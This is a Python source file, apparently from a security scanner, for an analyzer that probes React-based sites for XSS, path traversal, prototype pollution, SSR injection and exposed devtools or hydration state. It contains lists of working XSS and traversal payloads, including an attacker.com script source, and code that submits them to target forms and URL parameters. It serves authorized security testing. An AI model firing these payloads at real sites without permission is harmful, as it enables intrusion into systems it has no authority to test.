"""
Bloody Mary Analyzer - React Application Security Testing.

Implements 12 original attack patterns specifically targeting React applications,
Next.js, Nuxt.js, and other React-based frameworks. These patterns exploit
React-specific vulnerabilities including:

- dangerouslySetInnerHTML injection
- JSX prop injection vectors
- State hydration poisoning
- React DevTools exposure
- Server Component leaks
- useEffect race conditions
- Context Provider pollution
- Suspense boundary bypasses
- Redux DevTools exposure
- React Router path traversal
- Prop type confusion
- SSR injection points

This module is designed for authorized security testing only.
All active tests require explicit scan_mode='active' to execute.
"""

from __future__ import annotations

import asyncio
import hashlib
import json
import re
import time
from typing import Any, TypedDict
from urllib.parse import parse_qs, urljoin, urlparse

import httpx
import structlog

from secureprobe.analyzers.base import BaseAnalyzer
from secureprobe.models import AnalyzerType, Finding
from secureprobe.utils import safe_response_text

logger = structlog.get_logger(__name__)


class ReactFrameworkInfo(TypedDict):
    """Detected React framework information."""

    framework: str
    version: str | None
    is_production: bool
    has_devtools: bool
    state_containers: list[str]


class BloodyMaryAnalyzer(BaseAnalyzer):
    """
    Analyzer implementing 12 original React-specific attack patterns.

    These are novel detection mechanisms targeting:
    - React's dangerouslySetInnerHTML XSS vectors
    - JSX prop injection through user-controlled input
    - Hydration state poisoning in SSR frameworks
    - Development tool exposure in production
    - React Server Components information disclosure
    - Async race conditions in useEffect hooks
    - Context provider prototype pollution
    - Error boundary stack trace leakage
    - State management tool exposure
    - React Router path traversal attacks
    - Type confusion in prop handling
    - Server-side rendering injection vectors

    Attack Patterns:
    1. dangerouslySetInnerHTML Probing - XSS via React's escape hatch
    2. JSX Injection via Props - href, src, style, event handler injection
    3. React DevTools Exposure - Production devtools hook detection
    4. State Hydration Poisoning - __NEXT_DATA__, __NUXT__, __INITIAL_STATE__ XSS
    5. Server Component Leak - RSC payload information disclosure
    6. useEffect Race Condition - Async race via rapid concurrent requests
    7. Context Provider Override - Prototype pollution of React context
    8. Suspense Boundary Bypass - Error boundary stack trace leakage
    9. Redux DevTools in Production - Full state exposure via devtools
    10. React Router Path Traversal - Dynamic route parameter abuse
    11. Prop Type Confusion - Type mismatch crash exploitation
    12. SSR Injection Points - Meta tag and og: property injection
    """

    analyzer_type = AnalyzerType.BLOODY_MARY

    # dangerouslySetInnerHTML XSS payloads that survive React's escaping
    DANGEROUS_HTML_PAYLOADS: list[tuple[str, str]] = [
        ('<img src=x onerror="alert(\'XSS\')">', "Image onerror handler"),
        ('<svg onload="alert(\'XSS\')">', "SVG onload handler"),
        ('<iframe srcdoc="<script>alert(\'XSS\')</script>">', "Iframe srcdoc injection"),
        ('<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>', "Math element bypass"),
        ('<details open ontoggle="alert(\'XSS\')">', "Details ontoggle handler"),
        ('<body onpageshow="alert(\'XSS\')">', "Body onpageshow handler"),
        ('<input onfocus="alert(\'XSS\')" autofocus>', "Input autofocus trigger"),
        ('<marquee onstart="alert(\'XSS\')">', "Marquee onstart handler"),
        ('<video><source onerror="alert(\'XSS\')">', "Video source onerror"),
        ('<audio src=x onerror="alert(\'XSS\')">', "Audio onerror handler"),
    ]

    # JSX prop injection payloads
    JSX_PROP_PAYLOADS: dict[str, list[tuple[str, str]]] = {
        "href": [
            ("javascript:alert('XSS')", "JavaScript protocol"),
            ("data:text/html,<script>alert('XSS')</script>", "Data URI XSS"),
            ("javascript:/*<!--*/%0A%0Dalert('XSS')//-->", "JavaScript with comment bypass"),
            ("\x01javascript:alert('XSS')", "Control char prefix bypass"),
        ],
        "src": [
            ("javascript:alert('XSS')", "JavaScript protocol in src"),
            ("data:image/svg+xml,<svg onload=alert('XSS')>", "SVG data URI"),
            ("//attacker.com/malicious.js", "Protocol-relative URL"),
        ],
        "style": [
            ("background:url(javascript:alert('XSS'))", "CSS JavaScript URL"),
            ("behavior:url(malicious.htc)", "IE behavior directive"),
            ("-moz-binding:url(malicious.xml#xss)", "Firefox binding"),
        ],
        "formaction": [
            ("javascript:alert('XSS')", "Form action JavaScript"),
            ("data:text/html,<script>alert('XSS')</script>", "Form action data URI"),
        ],
    }

    # React state container globals to probe
    STATE_CONTAINERS: list[tuple[str, str, str]] = [
        ("window.__NEXT_DATA__", "Next.js", "SSR hydration state"),
        ("window.__NUXT__", "Nuxt.js", "Nuxt SSR state"),
        ("window.__INITIAL_STATE__", "Generic", "Common SSR pattern"),
        ("window.__PRELOADED_STATE__", "Redux", "Redux preloaded state"),
        ("window.__APOLLO_STATE__", "Apollo", "GraphQL cache state"),
        ("window.__RELAY_STORE__", "Relay", "Relay store data"),
        ("window.__REDUX_STATE__", "Redux", "Alternative Redux pattern"),
        ("window.__APP_STATE__", "Generic", "Application state"),
        ("window.__DATA__", "Generic", "Generic data container"),
        ("window.__REMIXCONTEXT", "Remix", "Remix framework context"),
        ("window.__staticRouterHydrationData", "React Router", "Router hydration data"),
    ]

    # DevTools detection scripts
    DEVTOOLS_PROBES: list[tuple[str, str, str]] = [
        (
            "window.__REACT_DEVTOOLS_GLOBAL_HOOK__",
            "React DevTools Hook",
            "React DevTools connection hook present",
        ),
        (
            "window.__REDUX_DEVTOOLS_EXTENSION__",
            "Redux DevTools Extension",
            "Redux DevTools extension API exposed",
        ),
        (
            "window.__REACT_DEVTOOLS_COMPONENT_FILTERS__",
            "React Component Filters",
            "DevTools component filtering enabled",
        ),
        (
            "window.__REACT_DEVTOOLS_ATTACH__",
            "React DevTools Attach",
            "DevTools attachment function exposed",
        ),
        (
            "window.__REDUX_DEVTOOLS_EXTENSION_COMPOSE__",
            "Redux DevTools Compose",
            "Redux enhancer composer exposed",
        ),
    ]

    # Server Component payload markers
    RSC_MARKERS: list[str] = [
        "0:",  # RSC stream start
        "$",  # RSC reference marker
        "@",  # RSC module reference
        "S:",  # RSC suspense boundary
        "E:",  # RSC error boundary
        "H:",  # RSC hint
        "T:",  # RSC template
        "I:",  # RSC import
    ]

    # Path traversal payloads for React Router
    PATH_TRAVERSAL_PAYLOADS: list[tuple[str, str]] = [
        ("../admin", "Single level traversal"),
        ("../../admin", "Double level traversal"),
        ("..%2Fadmin", "URL encoded traversal"),
        ("..%252Fadmin", "Double encoded traversal"),
        ("%2e%2e/admin", "Encoded dots traversal"),
        ("....//admin", "Double dot bypass"),
        ("..;/admin", "Semicolon bypass"),
        ("..\\/admin", "Backslash bypass"),
        ("..//../admin", "Mixed traversal"),
        ("%c0%ae%c0%ae/admin", "Overlong UTF-8 traversal"),
    ]

    # SSR injection test vectors for meta/og tags
    SSR_INJECTION_PAYLOADS: list[tuple[str, str, str]] = [
        ('<script>alert("XSS")</script>', "title", "Script in title tag"),
        ('"><script>alert("XSS")</script>', "meta", "Meta attribute breakout"),
        ("\" onload=\"alert('XSS')\" x=\"", "og:image", "Event handler in og:image"),
        ('javascript:alert("XSS")', "og:url", "JavaScript in og:url"),
        ('"><img src=x onerror=alert(1)>', "description", "Image injection in description"),
        ("{{constructor.constructor('alert(1)')()}}", "title", "Template literal injection"),
        ("${alert(1)}", "title", "Template string injection"),
        ('"-alert(1)-"', "meta", "Expression injection"),
    ]

    # Prop type confusion payloads
    PROP_TYPE_CONFUSION: list[tuple[str, Any, str]] = [
        ("string_as_object", {"__proto__": {"polluted": True}}, "Prototype pollution via prop"),
        ("string_as_array", [1, 2, "<script>alert(1)</script>"], "Array with XSS element"),
        ("number_as_string", "NaN", "NaN string injection"),
        ("boolean_as_object", {"valueOf": "alert(1)"}, "valueOf override"),
        ("array_as_object", {"length": -1, "0": "xss"}, "Negative length array-like"),
        ("function_as_string", "function(){alert(1)}", "Function string injection"),
        ("null_prototype", None, "Null value handling"),
        ("symbol_key", {"[Symbol.toPrimitive]": "alert"}, "Symbol toPrimitive"),
    ]

    async def analyze(
        self,
        url: str,
        page_data: dict[str, Any],
    ) -> list[Finding]:
        """
        Execute React-specific attack patterns against the target.

        Args:
            url: Target URL
            page_data: Page data including HTML, forms, headers, scripts

        Returns:
            List of discovered findings
        """
        findings: list[Finding] = []
        scan_mode = page_data.get("scan_mode", "passive")
        html = page_data.get("html", "")
        scripts = page_data.get("scripts", [])

        logger.info("bloody_mary_started", url=url, scan_mode=scan_mode)

        # Phase 1: Passive detection (always runs)
        framework_info = self._detect_react_framework(html, scripts)

        if not framework_info["framework"]:
            logger.debug(
                "bloody_mary_skipped",
                reason="No React framework detected",
                url=url,
            )
            return findings

        logger.info(
            "react_framework_detected",
            framework=framework_info["framework"],
            version=framework_info["version"],
            is_production=framework_info["is_production"],
        )

        # Attack 3: React DevTools Exposure (passive)
        findings.extend(self._detect_devtools_exposure(url, html, scripts, framework_info))

        # Attack 4: State Hydration Poisoning Detection (passive)
        findings.extend(self._detect_hydration_state_exposure(url, html, scripts))

        # Attack 5: Server Component Leak Detection (passive)
        findings.extend(self._detect_server_component_leaks(url, html, page_data))

        # Attack 8: Suspense Boundary Bypass - Error Boundary Leaks (passive)
        findings.extend(self._detect_error_boundary_leaks(url, html, scripts))

        # Attack 9: Redux DevTools in Production (passive)
        findings.extend(self._detect_redux_devtools_exposure(url, html, scripts))

        # Phase 2: Active testing (requires active mode)
        if scan_mode == "active":
            # Attack 1: dangerouslySetInnerHTML Probing
            findings.extend(await self._attack_dangerous_html_injection(url, page_data))

            # Attack 2: JSX Injection via Props
            findings.extend(await self._attack_jsx_prop_injection(url, page_data))

            # Attack 6: useEffect Race Condition
            findings.extend(await self._attack_useeffect_race_condition(url, page_data))

            # Attack 7: Context Provider Override (Prototype Pollution)
            findings.extend(await self._attack_context_provider_override(url, page_data))

            # Attack 10: React Router Path Traversal
            findings.extend(await self._attack_router_path_traversal(url, page_data))

            # Attack 11: Prop Type Confusion
            findings.extend(await self._attack_prop_type_confusion(url, page_data))

            # Attack 12: SSR Injection Points
            findings.extend(await self._attack_ssr_injection(url, page_data))

        logger.info(
            "bloody_mary_completed",
            url=url,
            findings_count=len(findings),
        )
        return findings

    def _detect_react_framework(
        self,
        html: str,
        scripts: list[str],
    ) -> ReactFrameworkInfo:
        """
        Detect React framework and version from page content.

        Returns:
            ReactFrameworkInfo with detected framework details
        """
        info: ReactFrameworkInfo = {
            "framework": "",
            "version": None,
            "is_production": True,
            "has_devtools": False,
            "state_containers": [],
        }

        combined_content = html + "\n".join(scripts)

        # Detect React presence
        react_markers = [
            r"__REACT",
            r"_reactRootContainer",
            r"data-reactroot",
            r"data-reactid",
            r"__react",
            r"ReactDOM",
            r"react-dom",
            r"createElement\(",
            r"__SECRET_INTERNALS_DO_NOT_USE",
        ]

        if not any(re.search(marker, combined_content, re.IGNORECASE) for marker in react_markers):
            return info

        info["framework"] = "React"

        # Detect specific framework
        if "__NEXT_DATA__" in combined_content or "next/dist" in combined_content:
            info["framework"] = "Next.js"
            # Extract Next.js version
            version_match = re.search(r'"version"\s*:\s*"([^"]+)"', combined_content)
            if version_match:
                info["version"] = version_match.group(1)

        elif "__NUXT__" in combined_content or "nuxt" in combined_content.lower():
            info["framework"] = "Nuxt.js"

        elif "__REMIX" in combined_content or "remix" in combined_content.lower():
            info["framework"] = "Remix"

        elif "gatsby" in combined_content.lower():
            info["framework"] = "Gatsby"

        # Detect production vs development
        dev_indicators = [
            "development",
            "__DEV__",
            "react.development",
            "localhost",
            "127.0.0.1",
            "process.env.NODE_ENV",
            "sourceMapping",
        ]
        info["is_production"] = not any(
            indicator.lower() in combined_content.lower() for indicator in dev_indicators
        )

        # Extract React version
        version_patterns = [
            r"React v([0-9]+\.[0-9]+\.[0-9]+)",
            r'"react":\s*"([^"]+)"',
            r"react@([0-9]+\.[0-9]+\.[0-9]+)",
        ]
        for pattern in version_patterns:
            match = re.search(pattern, combined_content)
            if match:
                info["version"] = match.group(1)
                break

        # Detect state containers
        for container_check, _, _ in self.STATE_CONTAINERS:
            var_name = container_check.replace("window.", "")
            if var_name in combined_content:
                info["state_containers"].append(var_name)

        return info

    def _detect_devtools_exposure(
        self,
        url: str,
        html: str,
        scripts: list[str],
        framework_info: ReactFrameworkInfo,
    ) -> list[Finding]:
        """
        Attack 3: Detect React DevTools hook exposure in production.

        The presence of __REACT_DEVTOOLS_GLOBAL_HOOK__ in production indicates
        the application can be inspected, revealing component hierarchy,
        props, state, and internal structure.
        """
        findings: list[Finding] = []
        combined_content = html + "\n".join(scripts)

        for probe, name, description in self.DEVTOOLS_PROBES:
            var_name = probe.replace("window.", "")
            if var_name in combined_content:
                # Additional check: is this actually exposed or just referenced?
                exposure_patterns = [
                    rf"{var_name}\s*=",
                    rf"typeof\s+{var_name}",
                    rf"{var_name}\s*&&",
                    rf"{var_name}\s*\?",
                ]

                if any(re.search(p, combined_content) for p in exposure_patterns):
                    severity = "HIGH" if framework_info["is_production"] else "LOW"

                    findings.append(
                        self._create_finding(
                            severity=severity,
                            title=f"{name} Exposed in {'Production' if framework_info['is_production'] else 'Development'}",
                            description=(
                                f"{description}. "
                                f"Framework: {framework_info['framework']}. "
                                "DevTools exposure allows attackers to inspect component hierarchy, "
                                "props, state values, and internal application structure. "
                                "This information can be used to craft targeted attacks against "
                                "specific components or discover hidden functionality."
                            ),
                            cwe_id="CWE-489",
                            cwe_name="Active Debug Code",
                            url=url,
                            evidence=f"Detected: {probe}\nFramework: {framework_info['framework']}",
                            remediation=(
                                "Disable React DevTools in production builds. "
                                "Set NODE_ENV=production during build. "
                                "Use __REACT_DEVTOOLS_GLOBAL_HOOK__ = { isDisabled: true } "
                                "before React loads to prevent connection. "
                                "Consider using react-dev-tools-disable package."
                            ),
                            cvss_score=6.5 if framework_info["is_production"] else 2.0,
                            references=[
                                "https://cwe.mitre.org/data/definitions/489.html",
                                "https://github.com/nicktomlin/react-devtools-disable",
                            ],
                            metadata={
                                "devtools_type": name,
                                "probe": probe,
                                "framework": framework_info["framework"],
                                "is_production": framework_info["is_production"],
                            },
                        )
                    )
                    break  # One devtools finding is sufficient

        return findings

    def _detect_hydration_state_exposure(
        self,
        url: str,
        html: str,
        scripts: list[str],
    ) -> list[Finding]:
        """
        Attack 4: Detect exposed hydration state that could be poisoned.

        SSR frameworks expose initial state in globals like __NEXT_DATA__.
        If this contains sensitive data or can be manipulated, it's vulnerable.
        """
        findings: list[Finding] = []

        # Look for state containers in HTML/scripts
        for container_check, framework, description in self.STATE_CONTAINERS:
            var_name = container_check.replace("window.", "")

            # Search for the variable assignment
            state_pattern = rf'{var_name}\s*=\s*(\{{[^}}]*\}}|\[[^\]]*\]|"[^"]*"|\'[^\']*\')'
            html_pattern = rf'<script[^>]*>\s*{var_name}\s*=\s*'

            matches = list(re.finditer(state_pattern, html))
            if not matches:
                for script in scripts:
                    matches.extend(re.finditer(state_pattern, script))

            if matches:
                # Extract and analyze the state content
                state_content = ""
                for match in matches[:1]:  # First match
                    state_content = match.group(1)[:500] if match.group(1) else ""

                # Check for sensitive data patterns
                sensitive_patterns = [
                    (r'"(api[_-]?key|apiKey)"', "API Key"),
                    (r'"(auth[_-]?token|authToken|token)"', "Auth Token"),
                    (r'"(secret|password|passwd)"', "Secret/Password"),
                    (r'"(session[_-]?id|sessionId)"', "Session ID"),
                    (r'"(private[_-]?key|privateKey)"', "Private Key"),
                    (r'"(admin|internal)"', "Admin/Internal data"),
                    (r'"(email|phone|ssn|credit)"', "PII"),
                    (r'"(jwt|bearer)"', "JWT Token"),
                ]

                found_sensitive: list[str] = []
                for pattern, name in sensitive_patterns:
                    if re.search(pattern, state_content, re.IGNORECASE):
                        found_sensitive.append(name)

                severity = "HIGH" if found_sensitive else "MEDIUM"

                findings.append(
                    self._create_finding(
                        severity=severity,
                        title=f"SSR Hydration State Exposed ({framework})",
                        description=(
                            f"{description} exposed in page source via {var_name}. "
                            f"{'Sensitive data types detected: ' + ', '.join(found_sensitive) + '. ' if found_sensitive else ''}"
                            "Attackers can read this state to extract sensitive information "
                            "or craft payloads targeting specific state values. "
                            "If state includes user input without sanitization, "
                            "XSS via hydration poisoning is possible."
                        ),
                        cwe_id="CWE-200",
                        cwe_name="Exposure of Sensitive Information to an Unauthorized Actor",
                        url=url,
                        evidence=(
                            f"Container: {var_name}\n"
                            f"Framework: {framework}\n"
                            f"Sensitive data found: {found_sensitive if found_sensitive else 'None detected'}\n"
                            f"State preview: {state_content[:200]}..."
                        ),
                        remediation=(
                            "Sanitize all user input before including in hydration state. "
                            "Never include secrets, tokens, or PII in client-side state. "
                            "Use server-only data fetching for sensitive information. "
                            "Implement Content-Security-Policy to mitigate XSS impact."
                        ),
                        cvss_score=7.5 if found_sensitive else 5.3,
                        references=[
                            "https://cwe.mitre.org/data/definitions/200.html",
                            "https://nextjs.org/docs/pages/building-your-application/data-fetching",
                        ],
                        metadata={
                            "container": var_name,
                            "framework": framework,
                            "sensitive_data": found_sensitive,
                        },
                    )
                )

        return findings

    def _detect_server_component_leaks(
        self,
        url: str,
        html: str,
        page_data: dict[str, Any],
    ) -> list[Finding]:
        """
        Attack 5: Detect React Server Components payload leaks.

        RSC payloads can expose internal component structure, file paths,
        and server-side implementation details.
        """
        findings: list[Finding] = []

        # Check network log for RSC requests
        network_log = page_data.get("network_log", [])
        rsc_requests: list[dict[str, Any]] = []

        for entry in network_log:
            entry_url = entry.get("url", "")
            if any(marker in entry_url for marker in ["_rsc", ".rsc", "?_rsc=", "&_rsc="]):
                rsc_requests.append(entry)

        # Check HTML for RSC markers
        rsc_content_found = False
        rsc_evidence: list[str] = []

        for marker in self.RSC_MARKERS:
            if marker in html:
                rsc_content_found = True
                # Find context around marker
                idx = html.find(marker)
                if idx >= 0:
                    context = html[max(0, idx - 20) : min(len(html), idx + 100)]
                    rsc_evidence.append(f"Marker '{marker}': ...{context}...")

        # Look for module references that leak paths
        # Use non-capturing groups (?:...) for nested groups to ensure
        # re.findall() returns strings, not tuples
        module_patterns = [
            r'"(file://[^"]+)"',
            r'"(/[a-zA-Z0-9_/-]+\.(?:tsx?|jsx?))"',
            r'"(@[a-zA-Z0-9_/-]+)"',
            r'"(node_modules/[^"]+)"',
        ]

        leaked_paths: list[str] = []
        for pattern in module_patterns:
            matches = re.findall(pattern, html)
            leaked_paths.extend(matches[:5])  # Limit to 5 per pattern

        if rsc_content_found or rsc_requests or leaked_paths:
            findings.append(
                self._create_finding(
                    severity="MEDIUM" if leaked_paths else "LOW",
                    title="React Server Components Payload Exposed",
                    description=(
                        "React Server Components (RSC) streaming payloads detected in page content. "
                        f"{'Module paths leaked: ' + ', '.join(leaked_paths[:3]) + '. ' if leaked_paths else ''}"
                        "RSC payloads can reveal internal component structure, file system paths, "
                        "and server implementation details that aid reconnaissance."
                    ),
                    cwe_id="CWE-200",
                    cwe_name="Exposure of Sensitive Information to an Unauthorized Actor",
                    url=url,
                    evidence=(
                        f"RSC markers found: {len(rsc_evidence)}\n"
                        f"RSC network requests: {len(rsc_requests)}\n"
                        f"Leaked paths: {leaked_paths[:5]}\n"
                        f"Evidence samples: {rsc_evidence[:2]}"
                    ),
                    remediation=(
                        "Review RSC payload content for sensitive information. "
                        "Avoid exposing internal file paths in production builds. "
                        "Use source maps only in development. "
                        "Consider obfuscating module references in production."
                    ),
                    cvss_score=5.3 if leaked_paths else 3.1,
                    references=[
                        "https://react.dev/reference/rsc/server-components",
                        "https://cwe.mitre.org/data/definitions/200.html",
                    ],
                    metadata={
                        "rsc_markers": len(rsc_evidence),
                        "rsc_requests": len(rsc_requests),
                        "leaked_paths": leaked_paths[:10],
                    },
                )
            )

        return findings

    def _detect_error_boundary_leaks(
        self,
        url: str,
        html: str,
        scripts: list[str],
    ) -> list[Finding]:
        """
        Attack 8: Detect Suspense/Error boundary leaks exposing stack traces.

        Error boundaries that leak stack traces reveal internal paths,
        component names, and can expose source code snippets.
        """
        findings: list[Finding] = []
        combined_content = html + "\n".join(scripts)

        # Patterns indicating error boundary stack trace leakage
        error_patterns = [
            (r"at\s+\w+\s+\([^)]+\.(?:tsx?|jsx?):\d+:\d+\)", "Stack trace with file location"),
            (r"Error:\s+[^\n]+\n\s+at\s+", "Error with stack trace"),
            (r"componentStack[\"']?\s*:\s*[\"']", "React componentStack exposed"),
            (r"__webpack_require__", "Webpack internals exposed"),
            (r"Cannot read propert(?:y|ies) of (?:null|undefined)", "Unhandled null error"),
            (r"Uncaught Error:", "Uncaught error in page"),
            (r"Minified React error #\d+", "React production error code"),
            (r"(?:Error|Warning):\s+Each child in (?:a|an?) (?:array|list)", "React key warning"),
        ]

        found_leaks: list[tuple[str, str]] = []
        for pattern, description in error_patterns:
            matches = re.findall(pattern, combined_content)
            if matches:
                found_leaks.append((description, matches[0][:100] if matches else ""))

        if found_leaks:
            findings.append(
                self._create_finding(
                    severity="MEDIUM",
                    title="Error Boundary Stack Trace Leakage",
                    description=(
                        "React error boundary or Suspense boundary is leaking technical details. "
                        f"Leak types: {', '.join(leak[0] for leak in found_leaks)}. "
                        "Stack traces expose internal file paths, component names, and line numbers. "
                        "This information aids attackers in understanding the application structure."
                    ),
                    cwe_id="CWE-209",
                    cwe_name="Generation of Error Message Containing Sensitive Information",
                    url=url,
                    evidence="\n".join(f"{leak[0]}: {leak[1]}" for leak in found_leaks[:5]),
                    remediation=(
                        "Implement custom error boundaries with user-friendly messages. "
                        "Log detailed errors server-side only. "
                        "Use source maps only in development. "
                        "Set NODE_ENV=production to enable minified error messages."
                    ),
                    cvss_score=5.3,
                    references=[
                        "https://react.dev/reference/react/Component#catching-rendering-errors-with-an-error-boundary",
                        "https://cwe.mitre.org/data/definitions/209.html",
                    ],
                    metadata={
                        "leak_types": [leak[0] for leak in found_leaks],
                        "samples": [leak[1] for leak in found_leaks[:3]],
                    },
                )
            )

        return findings

    def _detect_redux_devtools_exposure(
        self,
        url: str,
        html: str,
        scripts: list[str],
    ) -> list[Finding]:
        """
        Attack 9: Detect Redux DevTools extension exposure in production.

        Redux DevTools in production allows attackers to:
        - View entire application state
        - Replay actions to understand application logic
        - Time-travel debug to find vulnerabilities
        - Export state for offline analysis
        """
        findings: list[Finding] = []
        combined_content = html + "\n".join(scripts)

        redux_devtools_patterns = [
            (r"__REDUX_DEVTOOLS_EXTENSION__\s*\(\)", "Redux DevTools extension call"),
            (r"__REDUX_DEVTOOLS_EXTENSION_COMPOSE__", "Redux DevTools compose enhancer"),
            (r"window\.__REDUX_DEVTOOLS", "Redux DevTools window reference"),
            (r"composeWithDevTools", "Redux DevTools compose import"),
            (r"devToolsEnhancer", "Redux DevTools enhancer"),
        ]

        found_patterns: list[str] = []
        for pattern, description in redux_devtools_patterns:
            if re.search(pattern, combined_content):
                found_patterns.append(description)

        if found_patterns:
            # Check if there's a production check
            has_prod_check = re.search(
                r"(?:NODE_ENV|process\.env)[^}]*(?:production|prod)[^}]*DEVTOOLS",
                combined_content,
                re.IGNORECASE,
            )

            severity = "LOW" if has_prod_check else "HIGH"

            findings.append(
                self._create_finding(
                    severity=severity,
                    title="Redux DevTools Exposed in Production",
                    description=(
                        "Redux DevTools extension integration detected. "
                        f"{'Production environment check detected. ' if has_prod_check else 'No production check detected. '}"
                        f"Patterns found: {', '.join(found_patterns)}. "
                        "Redux DevTools allows viewing entire application state, "
                        "replaying actions, and exporting state for analysis. "
                        "Attackers can use this to extract sensitive data from the store."
                    ),
                    cwe_id="CWE-489",
                    cwe_name="Active Debug Code",
                    url=url,
                    evidence=f"Detected patterns: {found_patterns}\nProduction check: {bool(has_prod_check)}",
                    remediation=(
                        "Disable Redux DevTools in production: "
                        "const composeEnhancers = process.env.NODE_ENV !== 'production' "
                        "&& window.__REDUX_DEVTOOLS_EXTENSION_COMPOSE__ || compose; "
                        "Or use redux-devtools-extension with developmentOnly option."
                    ),
                    cvss_score=3.1 if has_prod_check else 7.5,
                    references=[
                        "https://github.com/reduxjs/redux-devtools",
                        "https://cwe.mitre.org/data/definitions/489.html",
                    ],
                    metadata={
                        "patterns": found_patterns,
                        "has_production_check": bool(has_prod_check),
                    },
                )
            )

        return findings

    async def _attack_dangerous_html_injection(
        self,
        url: str,
        page_data: dict[str, Any],
    ) -> list[Finding]:
        """
        Attack 1: dangerouslySetInnerHTML Probing.

        Inject payloads that could survive React's escaping via
        dangerouslySetInnerHTML and test if they're reflected.
        """
        findings: list[Finding] = []
        forms = page_data.get("forms", [])
        html = page_data.get("html", "")

        # First, detect if dangerouslySetInnerHTML is used
        dangerous_usage = re.search(r"dangerouslySetInnerHTML", html)
        if not dangerous_usage:
            # Check scripts
            for script in page_data.get("scripts", []):
                if "dangerouslySetInnerHTML" in script:
                    dangerous_usage = True
                    break

        if not dangerous_usage:
            logger.debug("no_dangerously_set_inner_html", url=url)
            return findings

        async with httpx.AsyncClient(
            timeout=15.0,
            verify=self.config.verify_ssl,
            follow_redirects=True,
        ) as client:
            # Test payloads through forms
            for form in forms:
                form_action = form.get("action", url)
                form_method = form.get("method", "get").upper()
                inputs = form.get("inputs", [])

                for payload, description in self.DANGEROUS_HTML_PAYLOADS[:5]:  # Limit tests
                    # Create form data with payload
                    form_data: dict[str, str] = {}
                    for inp in inputs:
                        input_name = inp.get("name", "")
                        if input_name:
                            form_data[input_name] = payload

                    if not form_data:
                        continue

                    try:
                        if form_method == "POST":
                            response = await client.post(
                                form_action,
                                data=form_data,
                                headers={"User-Agent": self.config.user_agent},
                            )
                        else:
                            response = await client.get(
                                form_action,
                                params=form_data,
                                headers={"User-Agent": self.config.user_agent},
                            )

                        # Check if payload is reflected unescaped
                        if payload in safe_response_text(response):
                            findings.append(
                                self._create_finding(
                                    severity="CRITICAL",
                                    title="dangerouslySetInnerHTML XSS Vulnerability",
                                    description=(
                                        f"XSS payload reflected via dangerouslySetInnerHTML. "
                                        f"Payload type: {description}. "
                                        "User input is being rendered through React's escape hatch "
                                        "without proper sanitization, enabling arbitrary JavaScript execution."
                                    ),
                                    cwe_id="CWE-79",
                                    cwe_name="Improper Neutralization of Input During Web Page Generation",
                                    url=form_action,
                                    evidence=(
                                        f"Payload: {payload[:100]}\n"
                                        f"Form: {form.get('id', 'unnamed')}\n"
                                        f"Method: {form_method}\n"
                                        f"Input fields: {list(form_data.keys())}"
                                    ),
                                    remediation=(
                                        "Never pass unsanitized user input to dangerouslySetInnerHTML. "
                                        "Use DOMPurify or similar library to sanitize HTML: "
                                        "dangerouslySetInnerHTML={{__html: DOMPurify.sanitize(userInput)}}. "
                                        "Consider using react-html-parser or html-react-parser instead."
                                    ),
                                    cvss_score=9.1,
                                    references=[
                                        "https://react.dev/reference/react-dom/components/common#dangerously-setting-the-inner-html",
                                        "https://github.com/cure53/DOMPurify",
                                        "https://cwe.mitre.org/data/definitions/79.html",
                                    ],
                                    metadata={
                                        "payload": payload,
                                        "description": description,
                                        "form_action": form_action,
                                    },
                                )
                            )
                            return findings  # One critical XSS is enough

                    except Exception as e:
                        logger.debug("dangerous_html_test_error", error=str(e))
                        continue

        return findings

    async def _attack_jsx_prop_injection(
        self,
        url: str,
        page_data: dict[str, Any],
    ) -> list[Finding]:
        """
        Attack 2: JSX Injection via Props.

        Test if user input flows into JSX props (href, src, style, event handlers)
        without sanitization.
        """
        findings: list[Finding] = []

        async with httpx.AsyncClient(
            timeout=15.0,
            verify=self.config.verify_ssl,
            follow_redirects=True,
        ) as client:
            parsed = urlparse(url)
            base_url = f"{parsed.scheme}://{parsed.netloc}"

            # Test URL parameters for prop injection
            query_params = parse_qs(parsed.query)

            for prop_type, payloads in self.JSX_PROP_PAYLOADS.items():
                for payload, description in payloads[:2]:  # Limit tests per type
                    # Test via query parameter
                    test_params = {
                        "q": payload,
                        "url": payload,
                        "link": payload,
                        "redirect": payload,
                        "next": payload,
                        "return": payload,
                        "callback": payload,
                    }

                    for param_name, param_value in test_params.items():
                        test_url = f"{base_url}{parsed.path}?{param_name}={param_value}"

                        try:
                            response = await client.get(
                                test_url,
                                headers={"User-Agent": self.config.user_agent},
                            )

                            # Check if payload appears in vulnerable prop context
                            prop_patterns = [
                                rf'href\s*=\s*["\'][^"\']*{re.escape(payload[:20])}',
                                rf'src\s*=\s*["\'][^"\']*{re.escape(payload[:20])}',
                                rf'style\s*=\s*["\'][^"\']*{re.escape(payload[:20])}',
                                rf'on\w+\s*=\s*["\'][^"\']*{re.escape(payload[:20])}',
                                rf'formaction\s*=\s*["\'][^"\']*{re.escape(payload[:20])}',
                                rf'action\s*=\s*["\'][^"\']*{re.escape(payload[:20])}',
                            ]

                            for pattern in prop_patterns:
                                if re.search(pattern, safe_response_text(response), re.IGNORECASE):
                                    findings.append(
                                        self._create_finding(
                                            severity="HIGH",
                                            title=f"JSX Prop Injection ({prop_type})",
                                            description=(
                                                f"User input reflected in {prop_type} prop without sanitization. "
                                                f"Injection type: {description}. "
                                                "Attackers can inject malicious URLs, JavaScript protocols, "
                                                "or event handlers through this prop."
                                            ),
                                            cwe_id="CWE-79",
                                            cwe_name="Improper Neutralization of Input During Web Page Generation",
                                            url=test_url,
                                            evidence=(
                                                f"Prop type: {prop_type}\n"
                                                f"Payload: {payload[:50]}\n"
                                                f"Parameter: {param_name}\n"
                                                f"Pattern matched: {pattern[:50]}"
                                            ),
                                            remediation=(
                                                "Validate and sanitize all user input before using in JSX props. "
                                                "For href/src: Use URL validation and allowlist protocols. "
                                                "For style: Use CSS-in-JS libraries with built-in sanitization. "
                                                "Never allow javascript: or data: protocols in URLs from user input."
                                            ),
                                            cvss_score=7.1,
                                            references=[
                                                "https://react.dev/learn/passing-props-to-a-component",
                                                "https://cwe.mitre.org/data/definitions/79.html",
                                            ],
                                            metadata={
                                                "prop_type": prop_type,
                                                "payload": payload,
                                                "parameter": param_name,
                                            },
                                        )
                                    )
                                    return findings  # One finding per attack type

                        except Exception as e:
                            logger.debug("jsx_prop_test_error", error=str(e))
                            continue

        return findings

    async def _attack_useeffect_race_condition(
        self,
        url: str,
        page_data: dict[str, Any],
    ) -> list[Finding]:
        """
        Attack 6: useEffect Race Condition.

